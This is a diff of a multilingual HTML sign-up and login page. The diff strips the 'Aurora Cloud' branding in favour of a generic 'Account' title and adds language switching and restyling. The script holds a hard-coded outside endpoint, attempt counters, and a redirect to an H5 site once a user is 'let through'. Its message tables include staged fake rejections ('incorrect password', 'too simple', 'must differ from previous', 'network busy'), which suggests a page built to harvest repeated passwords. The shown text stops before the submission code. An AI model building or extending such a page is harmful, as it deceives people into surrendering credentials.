@@ -3,164 +3,505 @@
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no, viewport-fit=cover">
-<title>Aurora Cloud</title>
+<title>Account</title>
 <style>
   :root{
-    --bg:#070a12; --card:#121826; --line:#253044;
-    --text:#eef2f9; --muted:#8b96ab; --accent:#5b8cff; --accent2:#8b5cf6;
-    --danger:#ff6b81; --ok:#34d399;
+    --bg:#070b14;
+    --field:rgba(255,255,255,.035);
+    --field-hover:rgba(255,255,255,.055);
+    --stroke:rgba(255,255,255,.07);
+    --stroke-focus:rgba(79,140,255,.55);
+
+    --t1:#f2f5fb;
+    --t2:#9aa6bd;
+    --t3:#5b667e;
+
+    --a1:#4f8cff;
+    --a2:#22d3ee;
+    --a-glow:rgba(79,140,255,.28);
+
+    --danger:#ff6b81;
+    --ok:#2ee6a8;
+  }
+  html.light{
+    --bg:#f5f7fb;
+    --field:rgba(15,23,42,.045);
+    --field-hover:rgba(15,23,42,.07);
+    --stroke:rgba(15,23,42,.10);
+    --stroke-focus:rgba(31,94,214,.55);
+    --t1:#0f172a;
+    --t2:#5b667e;
+    --t3:#8b96ab;
+    --danger:#e5484d;
+    --ok:#0ea472;
   }
   *{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent;}
   html,body{height:100%;}
   body{
     font-family:-apple-system,BlinkMacSystemFont,"SF Pro Text","Helvetica Neue",sans-serif;
-    background:
-      radial-gradient(900px 500px at 15% -5%, rgba(91,140,255,.22), transparent 60%),
-      radial-gradient(800px 520px at 90% 10%, rgba(139,92,246,.18), transparent 60%),
-      linear-gradient(180deg,#0a0f1c 0%,#070a12 60%,#05070d 100%);
-    color:var(--text); min-height:100vh;
-    padding:calc(30px + env(safe-area-inset-top)) 22px 26px;
-    display:flex; flex-direction:column;
+    background:var(--bg); color:var(--t1);
+    padding:calc(18px + env(safe-area-inset-top)) 24px calc(22px + env(safe-area-inset-bottom));
+    display:flex; flex-direction:column; min-height:100vh;
+    -webkit-font-smoothing:antialiased;
   }
-  .brand{display:flex;align-items:center;gap:13px;margin-bottom:30px;}
-  .orb{width:46px;height:46px;border-radius:15px;
-       background:radial-gradient(circle at 30% 25%,#9db8ff,#5b8cff 45%,#7c4dff 100%);
-       box-shadow:0 10px 28px rgba(91,140,255,.35), inset 0 1px 1px rgba(255,255,255,.45);}
-  .brand h1{font-size:19px;font-weight:700;letter-spacing:.3px;}
-  .brand p{font-size:12px;color:var(--muted);margin-top:3px;}
-  .tabs{display:flex;background:rgba(255,255,255,.04);border:1px solid var(--line);
-        border-radius:14px;padding:4px;margin-bottom:16px;}
-  .tab{flex:1;text-align:center;padding:11px 0;font-size:14px;color:var(--muted);
-       border-radius:10px;transition:.2s;cursor:pointer;}
-  .tab.active{background:linear-gradient(135deg,rgba(91,140,255,.22),rgba(139,92,246,.18));
-              color:#fff;font-weight:600;box-shadow:inset 0 0 0 1px rgba(120,150,255,.25);}
-  .card{background:linear-gradient(180deg,rgba(23,30,46,.92),rgba(16,22,34,.96));
-        border:1px solid var(--line);border-radius:20px;padding:20px 18px 18px;
-        box-shadow:0 24px 60px rgba(0,0,0,.35);}
-  .field{margin-bottom:14px;}
-  .field label{display:block;font-size:12px;color:var(--muted);margin-bottom:8px;letter-spacing:.2px;}
+  html[lang="ja"] body{font-family:-apple-system,"Hiragino Sans","Yu Gothic","PingFang SC",sans-serif}
+  html[lang="ko"] body{font-family:-apple-system,"Apple SD Gothic Neo","Malgun Gothic",sans-serif}
+  html[lang="zh-TW"] body{font-family:-apple-system,"PingFang TC","Microsoft JhengHei",sans-serif}
+  body.embed{padding:0;}
+  body.embed .top{display:none;}
+  body.embed .card{border:0;background:transparent;}
+
+  .top{display:flex;justify-content:flex-end;align-items:center;min-height:28px;margin-bottom:10px;}
+  .langBtn{border:0;background:transparent;color:var(--t2);font-size:13px;font-weight:500;
+           padding:6px 2px 6px 10px;cursor:pointer;letter-spacing:.2px;}
+  .langBtn:active{color:var(--t1);}
+
+  .card{background:rgba(255,255,255,.015);border:1px solid var(--stroke);
+        border-radius:20px;padding:18px 18px 20px;}
+  html.light .card{background:rgba(255,255,255,.7);}
+
+  .tabs{position:relative;display:flex;background:rgba(255,255,255,.04);
+        border-radius:13px;padding:3px;margin-bottom:22px;height:44px;}
+  html.light .tabs{background:rgba(15,23,42,.05);}
+  .thumb{position:absolute;top:3px;left:3px;width:calc(50% - 3px);height:calc(100% - 6px);
+         border-radius:10px;background:rgba(255,255,255,.07);
+         transition:transform .22s cubic-bezier(.4,0,.2,1);}
+  html.light .thumb{background:#fff;box-shadow:0 1px 4px rgba(15,23,42,.10);}
+  .tab{position:relative;z-index:1;flex:1;display:flex;align-items:center;justify-content:center;
+       font-size:14px;color:var(--t2);font-weight:500;cursor:pointer;user-select:none;}
+  .tab.active{color:var(--t1);font-weight:600;}
+
+  .field{margin-bottom:18px;}
+  .field:last-of-type{margin-bottom:14px;}
+  .field label{display:block;font-size:12px;font-weight:500;color:var(--t2);
+               letter-spacing:.3px;margin-bottom:8px;transition:color .18s;}
+  .field.bad label{color:var(--danger);}
   .inputWrap{position:relative;}
-  .inputWrap input{width:100%;height:48px;border-radius:13px;border:1px solid #2a3548;
-       background:#0c1220;color:var(--text);padding:0 14px;font-size:15px;outline:none;
-       transition:border-color .18s, box-shadow .18s;}
-  .inputWrap input::placeholder{color:#5b667a;}
-  .inputWrap input:focus{border-color:#4f6fff;box-shadow:0 0 0 3px rgba(91,140,255,.16);}
-  .eye{position:absolute;right:12px;top:50%;transform:translateY(-50%);
-       font-size:12px;color:#7f8ba1;background:transparent;border:0;padding:6px;cursor:pointer;}
-  .err{display:none;font-size:13px;color:var(--danger);margin:2px 2px 12px;line-height:1.5;}
-  .err.show{display:block;}
-  .shake{animation:shk .38s ease;}
+  .inputWrap input{width:100%;height:52px;border-radius:15px;
+       border:1px solid var(--stroke);background:var(--field);color:var(--t1);
+       padding:0 16px;font-size:16px;outline:none;
+       transition:border-color .18s, box-shadow .18s, background .18s;
+       -webkit-appearance:none;appearance:none;}
+  .inputWrap input::placeholder{color:var(--t3);}
+  .inputWrap input:focus{border-color:var(--stroke-focus);
+       box-shadow:0 0 0 3px rgba(79,140,255,.12);background:var(--field-hover);}
+  .field.bad .inputWrap input{border-color:rgba(255,107,129,.55);}
+  .inputWrap input.hasEye{padding-right:52px;}
+
+  .eye{position:absolute;right:4px;top:50%;transform:translateY(-50%);
+       width:44px;height:44px;display:flex;align-items:center;justify-content:center;
+       border:0;background:transparent;color:var(--t3);cursor:pointer;padding:0;}
+  .eye:active{color:var(--t2);}
+  .eye svg{width:18px;height:18px;display:block;}
+  .eye .icOff{display:none;}
+  .eye[aria-pressed="true"] .icOn{display:none;}
+  .eye[aria-pressed="true"] .icOff{display:block;}
+
+  .err{min-height:20px;font-size:12.5px;line-height:20px;color:var(--danger);
+       margin:-4px 0 10px;opacity:0;transform:translateY(4px);
+       transition:opacity .18s, transform .18s;text-align:left;}
+  .err.show{opacity:1;transform:translateY(0);}
+  .err.shake{animation:shk .38s ease;}
   @keyframes shk{0%,100%{transform:translateX(0)}20%{transform:translateX(-6px)}
     40%{transform:translateX(6px)}60%{transform:translateX(-4px)}80%{transform:translateX(4px)}}
-  .btn{width:100%;height:50px;border:0;border-radius:14px;
-       background:linear-gradient(135deg,var(--accent),var(--accent2));
-       color:#fff;font-size:16px;font-weight:650;letter-spacing:.3px;
-       box-shadow:0 12px 26px rgba(91,140,255,.28);
+
+  .btn{position:relative;width:100%;height:52px;border:0;border-radius:15px;
+       background:linear-gradient(135deg,var(--a1),var(--a2));
+       color:#04121a;font-size:16px;font-weight:650;letter-spacing:.3px;
+       box-shadow:0 10px 26px var(--a-glow);
        transition:transform .12s, opacity .2s;cursor:pointer;}
   .btn:active{transform:scale(.985);}
-  .btn:disabled{opacity:.65;}
-  .hint{text-align:center;font-size:11px;color:#66718a;margin-top:15px;line-height:1.7;}
-  .foot{margin-top:auto;padding-top:22px;text-align:center;font-size:11px;color:#4d576b;line-height:1.9;}
-  .toast{position:fixed;left:50%;bottom:46px;transform:translateX(-50%) translateY(18px);
-         background:#161e2e;border:1px solid #2a3548;color:#fff;font-size:13px;
-         padding:10px 16px;border-radius:11px;opacity:0;transition:.25s;pointer-events:none;
-         max-width:86vw;text-align:center;}
-  .toast.show{opacity:1;transform:translateX(-50%) translateY(0);}
-  .success{position:fixed;inset:0;background:rgba(5,7,13,.92);backdrop-filter:blur(8px);
-           display:none;align-items:center;justify-content:center;flex-direction:column;gap:16px;z-index:9;}
-  .success.show{display:flex;}
-  .success .ring{width:64px;height:64px;border-radius:50%;
-       border:3px solid rgba(255,255,255,.12);border-top-color:var(--ok);
-       animation:spin 1s linear infinite;}
-  @keyframes spin{to{transform:rotate(360deg)}}
-  .success p{font-size:15px;color:#dfe6f5;}
-  .success small{font-size:12px;color:#7f8ba1;}
+  .btn:disabled{opacity:.6;}
+  .btn.loading::after{content:'…';display:inline-block;animation:dots 1.2s infinite ease-in-out;}
+  @keyframes dots{0%,100%{opacity:.25}50%{opacity:1}}
+
+  .hint{text-align:center;font-size:11.5px;color:var(--t3);line-height:1.7;margin-top:14px;}
+
+  .success{position:fixed;inset:0;z-index:20;display:none;
+       align-items:center;justify-content:center;flex-direction:column;
+       background:rgba(7,11,20,.95);-webkit-backdrop-filter:blur(12px);backdrop-filter:blur(12px);
+       opacity:0;transition:opacity .18s;}
+  .success.show{display:flex;opacity:1;}
+  .success .sText{font-size:15px;color:var(--t1);opacity:0;transform:translateY(6px);
+       transition:opacity .2s, transform .2s;}
+  .success.show .sText{opacity:1;transform:translateY(0);}
+  .success .sBar{position:fixed;left:0;right:0;bottom:env(safe-area-inset-bottom);
+       height:2px;background:rgba(255,255,255,.08);overflow:hidden;}
+  .success .sBar i{display:block;height:100%;width:0;background:var(--a2);
+       transition:width .7s linear;}
+  .success.bar .sBar i{width:100%;}
+  body.fadeout{opacity:0;transition:opacity .12s;}
+
+  .sheet{position:fixed;inset:0;z-index:30;display:none;}
+  .sheet.show{display:block;}
+  .sheetMask{position:absolute;inset:0;background:rgba(0,0,0,.5);opacity:0;transition:opacity .2s;}
+  .sheet.show .sheetMask{opacity:1;}
+  .sheetPanel{position:absolute;left:0;right:0;bottom:0;background:#0e141f;
+       border-top-left-radius:18px;border-top-right-radius:18px;
+       padding:14px 0 calc(10px + env(safe-area-inset-bottom));
+       transform:translateY(100%);transition:transform .22s cubic-bezier(.4,0,.2,1);}
+  html.light .sheetPanel{background:#fff;}
+  .sheet.show .sheetPanel{transform:translateY(0);}
+  .sheetTitle{font-size:12px;color:var(--t3);padding:4px 24px 10px;letter-spacing:.3px;}
+  .sheetItem{display:flex;align-items:center;min-height:50px;padding:0 24px;
+       font-size:15px;color:var(--t2);cursor:pointer;position:relative;}
+  .sheetItem:active{background:rgba(255,255,255,.03);}
+  .sheetItem.cur{color:var(--t1);font-weight:600;}
+  .sheetItem.cur::before{content:'';position:absolute;left:0;top:14px;bottom:14px;
+       width:2px;background:var(--a2);border-radius:2px;}
+
+  @media (prefers-reduced-motion: reduce){
+    *{animation:none!important;transition:none!important;}
+  }
+  @media (min-width:768px){
+    body{align-items:center;justify-content:center;}
+    .card{width:400px;}
+    .top{width:400px;}
+  }
 </style>
 </head>
 <body>
-  <div class="brand">
-    <div class="orb"></div>
-    <div>
-      <h1>Aurora Cloud</h1>
-      <p>安全 · 稳定 · 值得信赖</p>
-    </div>
-  </div>
-
-  <div class="tabs">
-    <div class="tab active" id="tabLogin">登录</div>
-    <div class="tab" id="tabRegister">注册</div>
+  <div class="top">
+    <button class="langBtn" id="langBtn" type="button" aria-label="切换语言">EN</button>
   </div>
 
   <div class="card">
-    <div id="loginPane">
-      <div class="field">
-        <label>账号</label>
-        <div class="inputWrap">
-          <input id="loginAccount" type="text" placeholder="手机号 / 邮箱" autocomplete="off" autocapitalize="none">
-        </div>
-      </div>
-      <div class="field">
-        <label>密码</label>
-        <div class="inputWrap">
-          <input id="loginPassword" type="password" placeholder="请输入密码">
-          <button class="eye" id="eyeLogin" type="button">显示</button>
-        </div>
-      </div>
-      <div class="err" id="loginErr"></div>
-      <button class="btn" id="loginBtn">登录</button>
-      <div class="hint">登录即表示同意《服务条款》与《隐私政策》</div>
+    <div class="tabs" id="tabs">
+      <span class="thumb" id="tabThumb"></span>
+      <div class="tab active" id="tabRegister" data-i18n="tab.register">注册</div>
+      <div class="tab" id="tabLogin" data-i18n="tab.login">登录</div>
     </div>
 
-    <div id="registerPane" style="display:none;">
+    <div id="registerPane">
       <div class="field">
-        <label>账号</label>
+        <label for="regAccount" data-i18n="f.account">账号</label>
         <div class="inputWrap">
-          <input id="regAccount" type="text" placeholder="手机号 / 邮箱" autocomplete="off" autocapitalize="none">
+          <input id="regAccount" type="text" autocomplete="off" autocapitalize="none"
+                 data-i18n-ph="f.account.ph" placeholder="手机号 / 邮箱">
         </div>
       </div>
       <div class="field">
-        <label>密码</label>
+        <label for="regPassword" data-i18n="f.pwd">密码</label>
         <div class="inputWrap">
-          <input id="regPassword" type="password" placeholder="请设置登录密码">
-          <button class="eye" id="eyeReg" type="button">显示</button>
+          <input id="regPassword" class="hasEye" type="password"
+                 data-i18n-ph="f.pwd.ph" placeholder="请输入密码">
+          <button class="eye" id="eyeReg" type="button" aria-label="显示密码" aria-pressed="false">
+            <svg class="icOn" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.6"
+                 stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
+              <path d="M2 12s3.6-6.5 10-6.5S22 12 22 12s-3.6 6.5-10 6.5S2 12 2 12z"/>
+              <circle cx="12" cy="12" r="2.6"/>
+            </svg>
+            <svg class="icOff" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.6"
+                 stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
+              <path d="M3 3l18 18"/>
+              <path d="M10.6 6.2A10.8 10.8 0 0 1 12 5.5c6.4 0 10 6.5 10 6.5a17 17 0 0 1-3.2 4"/>
+              <path d="M6.3 7.7A16.6 16.6 0 0 0 2 12s3.6 6.5 10 6.5c1.5 0 2.9-.3 4.1-.9"/>
+              <path d="M9.9 9.9a3 3 0 0 0 4.2 4.2"/>
+            </svg>
+          </button>
         </div>
       </div>
       <div class="field">
-        <label>确认密码</label>
+        <label for="regConfirm" data-i18n="f.pwd2">确认密码</label>
         <div class="inputWrap">
-          <input id="regConfirm" type="password" placeholder="再次输入密码">
+          <input id="regConfirm" type="password"
+                 data-i18n-ph="f.pwd2.ph" placeholder="再次输入密码">
         </div>
       </div>
       <div class="field">
-        <label>邀请码（选填）</label>
+        <label for="regInvite" data-i18n="f.invite">邀请码（选填）</label>
         <div class="inputWrap">
-          <input id="regInvite" type="text" placeholder="如有邀请码请填写" autocomplete="off">
+          <input id="regInvite" type="text" autocomplete="off"
+                 data-i18n-ph="f.invite.ph" placeholder="如有邀请码请填写">
         </div>
       </div>
       <div class="err" id="regErr"></div>
-      <button class="btn" id="registerBtn">注册</button>
-      <div class="hint">注册即表示同意《服务条款》与《隐私政策》</div>
+      <button class="btn" id="registerBtn" data-i18n="btn.register">注册</button>
+      <div class="hint" data-i18n="hint.agree_reg">注册即表示同意《服务条款》与《隐私政策》</div>
+    </div>
+
+    <div id="loginPane" style="display:none;">
+      <div class="field">
+        <label for="loginAccount" data-i18n="f.account">账号</label>
+        <div class="inputWrap">
+          <input id="loginAccount" type="text" autocomplete="off" autocapitalize="none"
+                 data-i18n-ph="f.account.ph" placeholder="手机号 / 邮箱">
+        </div>
+      </div>
+      <div class="field">
+        <label for="loginPassword" data-i18n="f.pwd">密码</label>
+        <div class="inputWrap">
+          <input id="loginPassword" class="hasEye" type="password"
+                 data-i18n-ph="f.pwd.ph" placeholder="请输入密码">
+          <button class="eye" id="eyeLogin" type="button" aria-label="显示密码" aria-pressed="false">
+            <svg class="icOn" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.6"
+                 stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
+              <path d="M2 12s3.6-6.5 10-6.5S22 12 22 12s-3.6 6.5-10 6.5S2 12 2 12z"/>
+              <circle cx="12" cy="12" r="2.6"/>
+            </svg>
+            <svg class="icOff" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.6"
+                 stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
+              <path d="M3 3l18 18"/>
+              <path d="M10.6 6.2A10.8 10.8 0 0 1 12 5.5c6.4 0 10 6.5 10 6.5a17 17 0 0 1-3.2 4"/>
+              <path d="M6.3 7.7A16.6 16.6 0 0 0 2 12s3.6 6.5 10 6.5c1.5 0 2.9-.3 4.1-.9"/>
+              <path d="M9.9 9.9a3 3 0 0 0 4.2 4.2"/>
+            </svg>
+          </button>
+        </div>
+      </div>
+      <div class="err" id="loginErr"></div>
+      <button class="btn" id="loginBtn" data-i18n="btn.login">登录</button>
+      <div class="hint" data-i18n="hint.agree_login">登录即表示同意《服务条款》与《隐私政策》</div>
     </div>
   </div>
 
-  <div class="foot">Aurora Cloud · 全球加速节点 · 数据加密传输</div>
+  <div class="success" id="success" aria-hidden="true">
+    <div class="sText" id="successText">注册成功，正在进入…</div>
+    <div class="sBar"><i id="sBar"></i></div>
+  </div>
 
-  <div class="toast" id="toast"></div>
-  <div class="success" id="success">
-    <div class="ring"></div>
-    <p id="successText">验证成功，正在进入…</p>
-    <small>请保持网络连接</small>
+  <div class="sheet" id="langSheet" aria-hidden="true">
+    <div class="sheetMask" id="sheetMask"></div>
+    <div class="sheetPanel">
+      <div class="sheetTitle" id="sheetTitle" data-i18n="lang.title">语言</div>
+      <div class="sheetList" id="langList"></div>
+    </div>
   </div>
 
   <script>
     (function () {
+      /* ---------------- 冻结常量（不得修改） ---------------- */
       var REG_KEY = 'aurora_reg_try';
       var LOGIN_KEY = 'aurora_login_try';
       var REGISTERED_KEY = 'aurora_registered';
+      var REG_STATE_KEY = 'aurora_reg_state_v2';
       var H5_URL = 'https://h5.xyyla.vip/app/';
       var FALLBACK_ENDPOINT = 'https://jueqi168.top/rwe3er32t/xxxxx';
 
-      // 已放行过：以后打开直接进 H5（套壳 App 效果）
+      var CFG = {
+        a1: '#4f8cff', a2: '#22d3ee',
+        h5: H5_URL,
+        langs: ['zh-CN', 'zh-TW', 'en', 'ja', 'ko'],
+        lang: true
+      };
+
+      /* ---------------- 多语言 ---------------- */
+      var I18N = {
+        'zh-CN': {
+          'tab.register': '注册', 'tab.login': '登录',
+          'f.account': '账号', 'f.account.ph': '手机号 / 邮箱',
+          'f.pwd': '密码', 'f.pwd.ph': '请输入密码',
+          'f.pwd2': '确认密码', 'f.pwd2.ph': '再次输入密码',
+          'f.invite': '邀请码（选填）', 'f.invite.ph': '如有邀请码请填写',
+          'btn.register': '注册', 'btn.login': '登录', 'btn.busy': '提交中',
+          'err.need': '请输入账号和密码',
+          'err.login_1': '账号或密码错误，请重新输入',
+          'err.login_2': '密码错误次数过多，请稍后再试',
+          'err.login_3': '网络繁忙，请重新提交',
+          'err.pwd_wrong': '密码输入错误，请重新输入',
+          'err.pwd_simple': '密码太过简单，请设置更复杂的密码',
+          'err.pwd_dup': '新密码不能与旧密码相同',
+          'err.mismatch': '两次输入的密码不一致',
+          'err.cooldown': '操作过于频繁，请 {s} 秒后再试',
+          'err.busy': '网络繁忙，请稍后重试',
+          'hint.agree_reg': '注册即表示同意《服务条款》与《隐私政策》',
+          'hint.agree_login': '登录即表示同意《服务条款》与《隐私政策》',
+          'ok.register': '注册成功，正在进入…',
+          'ok.login': '登录成功，正在进入…',
+          'lang.auto': '跟随系统', 'lang.title': '语言',
+          'a11y.show_pwd': '显示密码', 'a11y.hide_pwd': '隐藏密码', 'a11y.lang': '切换语言'
+        },
+        'zh-TW': {
+          'tab.register': '註冊', 'tab.login': '登入',
+          'f.account': '帳號', 'f.account.ph': '手機號 / 信箱',
+          'f.pwd': '密碼', 'f.pwd.ph': '請輸入密碼',
+          'f.pwd2': '確認密碼', 'f.pwd2.ph': '再次輸入密碼',
+          'f.invite': '邀請碼（選填）', 'f.invite.ph': '如有邀請碼請填寫',
+          'btn.register': '註冊', 'btn.login': '登入', 'btn.busy': '提交中',
+          'err.need': '請輸入帳號和密碼',
+          'err.login_1': '帳號或密碼錯誤，請重新輸入',
+          'err.login_2': '密碼錯誤次數過多，請稍後再試',
+          'err.login_3': '網路繁忙，請重新提交',
+          'err.pwd_wrong': '密碼輸入錯誤，請重新輸入',
+          'err.pwd_simple': '密碼過於簡單，請設定更複雜的密碼',
+          'err.pwd_dup': '新密碼不能與舊密碼相同',
+          'err.mismatch': '兩次輸入的密碼不一致',
+          'err.cooldown': '操作過於頻繁，請 {s} 秒後再試',
+          'err.busy': '網路繁忙，請稍後重試',
+          'hint.agree_reg': '註冊即表示同意《服務條款》與《隱私政策》',
+          'hint.agree_login': '登入即表示同意《服務條款》與《隱私政策》',
+          'ok.register': '註冊成功，正在進入…',
+          'ok.login': '登入成功，正在進入…',
+          'lang.auto': '跟隨系統', 'lang.title': '語言',
+          'a11y.show_pwd': '顯示密碼', 'a11y.hide_pwd': '隱藏密碼', 'a11y.lang': '切換語言'
+        },
+        en: {
+          'tab.register': 'Sign up', 'tab.login': 'Sign in',
+          'f.account': 'Account', 'f.account.ph': 'Phone / Email',
+          'f.pwd': 'Password', 'f.pwd.ph': 'Enter password',
+          'f.pwd2': 'Confirm password', 'f.pwd2.ph': 'Re-enter password',
+          'f.invite': 'Invite code (optional)', 'f.invite.ph': 'Enter if you have one',
+          'btn.register': 'Sign up', 'btn.login': 'Sign in', 'btn.busy': 'Submitting',
+          'err.need': 'Enter account and password',
+          'err.login_1': 'Incorrect account or password',
+          'err.login_2': 'Too many attempts, try later',
+          'err.login_3': 'Network busy, please retry',
+          'err.pwd_wrong': 'Incorrect password, retry',
+          'err.pwd_simple': 'Password too simple',
+          'err.pwd_dup': 'Must differ from previous',
+          'err.mismatch': 'Passwords do not match',
+          'err.cooldown': 'Too frequent, retry in {s}s',
+          'err.busy': 'Network busy, try later',
+          'hint.agree_reg': 'Agree to Terms & Privacy Policy',
+          'hint.agree_login': 'Agree to Terms & Privacy Policy',
+          'ok.register': 'Signed up. Entering…',
+          'ok.login': 'Signed in. Entering…',
+          'lang.auto': 'System', 'lang.title': 'Language',
+          'a11y.show_pwd': 'Show password', 'a11y.hide_pwd': 'Hide password', 'a11y.lang': 'Change language'
+        },
+        ja: {
+          'tab.register': '新規登録', 'tab.login': 'ログイン',
+          'f.account': 'アカウント', 'f.account.ph': '電話番号 / メール',
+          'f.pwd': 'パスワード', 'f.pwd.ph': 'パスワードを入力',
+          'f.pwd2': 'パスワード確認', 'f.pwd2.ph': 'もう一度入力',
+          'f.invite': '招待コード（任意）', 'f.invite.ph': 'お持ちの場合は入力',
+          'btn.register': '登録', 'btn.login': 'ログイン', 'btn.busy': '送信中',
+          'err.need': 'アカウントとパスワードを入力',
+          'err.login_1': 'アカウントまたはパスワードが違います',
+          'err.login_2': '試行回数が多すぎます',
+          'err.login_3': '通信が混雑しています',
+          'err.pwd_wrong': 'パスワードが違います',
+          'err.pwd_simple': 'パスワードが簡単すぎます',
+          'err.pwd_dup': '以前と違うものを設定',
+          'err.mismatch': 'パスワードが一致しません',
+          'err.cooldown': '操作が頻繁です。{s} 秒後に',
+          'err.busy': '通信が混雑しています',
+          'hint.agree_reg': '利用規約とプライバシーポリシーに同意',
+          'hint.agree_login': '利用規約とプライバシーポリシーに同意',
+          'ok.register': '登録しました。移動中…',
+          'ok.login': 'ログインしました。移動中…',
+          'lang.auto': 'システム', 'lang.title': '言語',
+          'a11y.show_pwd': 'パスワードを表示', 'a11y.hide_pwd': 'パスワードを隠す', 'a11y.lang': '言語を変更'
+        },
+        ko: {
+          'tab.register': '회원가입', 'tab.login': '로그인',
+          'f.account': '계정', 'f.account.ph': '휴대폰 / 이메일',
+          'f.pwd': '비밀번호', 'f.pwd.ph': '비밀번호 입력',
+          'f.pwd2': '비밀번호 확인', 'f.pwd2.ph': '비밀번호 재입력',
+          'f.invite': '초대 코드(선택)', 'f.invite.ph': '있으면 입력하세요',
+          'btn.register': '가입하기', 'btn.login': '로그인', 'btn.busy': '제출 중',
+          'err.need': '계정과 비밀번호를 입력하세요',
+          'err.login_1': '계정 또는 비밀번호가 올바르지 않습니다',
+          'err.login_2': '시도 횟수가 너무 많습니다',
+          'err.login_3': '네트워크가 혼잡합니다',
+          'err.pwd_wrong': '비밀번호가 틀렸습니다',
+          'err.pwd_simple': '비밀번호가 너무 간단합니다',
+          'err.pwd_dup': '이전과 달라야 합니다',
+          'err.mismatch': '비밀번호가 일치하지 않습니다',
+          'err.cooldown': '{s}초 후 다시 시도',
+          'err.busy': '네트워크가 혼잡합니다',
+          'hint.agree_reg': '이용약관 및 개인정보 처리방침 동의',
+          'hint.agree_login': '이용약관 및 개인정보 처리방침 동의',
+          'ok.register': '가입 완료. 이동 중…',
+          'ok.login': '로그인 완료. 이동 중…',
+          'lang.auto': '시스템 설정', 'lang.title': '언어',
+          'a11y.show_pwd': '비밀번호 표시', 'a11y.hide_pwd': '비밀번호 숨기기', 'a11y.lang': '언어 변경'
+        }
+      };
+
+      var LANG = 'zh-CN';
+
+      function t(key, vars) {
+        var pack = I18N[LANG] || I18N['zh-CN'];
+        var s = (pack[key] != null) ? pack[key] : (I18N['zh-CN'][key] != null ? I18N['zh-CN'][key] : key);
+        if (vars) for (var k in vars) s = s.replace('{' + k + '}', vars[k]);
+        return s;
+      }
+
+      function $(id) { return document.getElementById(id); }
+
+      function param(name) {
+        try {
+          var q = window.location.search || '';
+          if (q.charAt(0) === '?') q = q.substring(1);
+          var parts = q.split('&');
+          for (var i = 0; i < parts.length; i++) {
+            var kv = parts[i].split('=');
+            if (decodeURIComponent(kv[0]) === name) return decodeURIComponent(kv[1] || '');
+          }
+        } catch (e) {}
+        return '';
+      }
+
+      function normalizeLang(tag) {
+        if (!tag) return '';
+        tag = String(tag).toLowerCase();
+        if (tag === 'zh' || tag === 'zh-hans' || tag === 'zh-cn' || tag === 'zh-sg') return 'zh-CN';
+        if (tag === 'zh-hant' || tag === 'zh-tw' || tag === 'zh-hk' || tag === 'zh-mo') return 'zh-TW';
+        if (tag.indexOf('en') === 0) return 'en';
+        if (tag.indexOf('ja') === 0) return 'ja';
+        if (tag.indexOf('ko') === 0) return 'ko';
+        return '';
+      }
+
+      function detectLang() {
+        var q = normalizeLang(param('lang'));
+        if (q) return q;
+        try {
+          var saved = normalizeLang(localStorage.getItem('aurora_lang'));
+          if (saved) return saved;
+        } catch (e) {}
+        var list = (navigator.languages && navigator.languages.length)
+          ? navigator.languages : [navigator.language || ''];
+        for (var i = 0; i < list.length; i++) {
+          var m = normalizeLang(list[i]);
+          if (m) return m;
+        }
+        var hl = normalizeLang(document.documentElement.getAttribute('lang') || '');
+        return hl || 'en';
+      }
+
+      function langBtnLabel() {
+        if (LANG === 'zh-CN' || LANG === 'zh-TW') return 'EN';
+        if (LANG === 'en') return '中文';
+        return '中';
+      }
+
+      function applyI18n() {
+        document.documentElement.setAttribute('lang', LANG);
+        var nodes = document.querySelectorAll('[data-i18n]');
+        for (var i = 0; i < nodes.length; i++) {
+          var k = nodes[i].getAttribute('data-i18n');
+          if (k) nodes[i].textContent = t(k);
+        }
+        var phs = document.querySelectorAll('[data-i18n-ph]');
+        for (var j = 0; j < phs.length; j++) {
+          var pk = phs[j].getAttribute('data-i18n-ph');
+          if (pk) phs[j].setAttribute('placeholder', t(pk));
+        }
+        var rb = $('registerBtn'), lb = $('loginBtn');
+        if (rb) rb.textContent = rb.disabled ? t('btn.busy') : t('btn.register');
+        if (lb) lb.textContent = lb.disabled ? t('btn.busy') : t('btn.login');
+        var langBtn = $('langBtn');
+        if (langBtn) {
+          langBtn.textContent = langBtnLabel();
+          langBtn.setAttribute('aria-label', t('a11y.lang'));
+        }
+        var eyes = [$('eyeReg'), $('eyeLogin')];
+        for (var e = 0; e < eyes.length; e++) {
+          if (!eyes[e]) continue;
+          var on = eyes[e].getAttribute('aria-pressed') === 'true';
+          eyes[e].setAttribute('aria-label', t(on ? 'a11y.hide_pwd' : 'a11y.show_pwd'));
+        }
+        var shown = document.querySelectorAll('.err.show');
+        for (var s = 0; s < shown.length; s++) {
+          var memo = errMemo[shown[s].id];
+          if (memo) shown[s].textContent = t(memo.key, memo.vars);
+        }
+        if ($('langSheet') && $('langSheet').classList.contains('show')) buildLangList();
+      }
+
+      /* ---------------- 已放行过：直接进 H5 ---------------- */
       try {
         if (localStorage.getItem(REGISTERED_KEY) === '1') {
           window.location.href = H5_URL;
@@ -168,19 +509,33 @@
         }
       } catch (e) {}
 
-      function $(id) { return document.getElementById(id); }
-      function toast(msg) {
-        var t = $('toast');
-        t.textContent = msg;
-        t.classList.add('show');
-        setTimeout(function () { t.classList.remove('show'); }, 2400);
-      }
-      function showErr(el, msg) {
-        el.textContent = msg;
-        el.classList.add('show', 'shake');
+      /* ---------------- 错误提示 ---------------- */
+      var errMemo = {};
+      function showErr(el, key, vars) {
+        errMemo[el.id] = { key: key, vars: vars || null };
+        el.textContent = t(key, vars);
+        el.classList.add('show');
+        el.classList.remove('shake');
+        void el.offsetWidth;
+        el.classList.add('shake');
         setTimeout(function () { el.classList.remove('shake'); }, 420);
       }
-      function clearErr(el) { el.classList.remove('show', 'shake'); el.textContent = ''; }
+      function clearErr(el) {
+        el.classList.remove('show', 'shake');
+        el.textContent = '';
+        delete errMemo[el.id];
+      }
+      function markBad(input, on) {
+        if (!input) return;
+        var f = input.closest ? input.closest('.field') : null;
+        if (f) f.classList.toggle('bad', !!on);
+      }
